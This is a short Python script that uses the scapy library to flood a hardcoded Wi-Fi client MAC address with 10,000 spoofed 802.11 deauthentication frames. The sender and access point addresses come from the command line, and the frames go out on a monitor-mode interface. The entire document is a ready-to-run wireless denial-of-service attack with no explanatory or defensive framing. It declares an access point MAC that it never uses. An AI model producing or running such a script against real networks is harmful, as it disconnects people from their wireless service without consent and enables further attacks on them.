import sys 
from scapy.all import *

target_mac = "98:F6:21:83:ED:E0"

ap_mac = "00:5F:67:31:1C:F6"


deauth_packet = scapy.RadioTap() / scapy.Dot11(type = 0, subtype = 12, addr1 = target_mac, addr2 = sys.argv[1], addr3 = sys.argv[1]) 

sendp(deauth_packet, iface="wlan0mon", count = 10000, inter = .2)
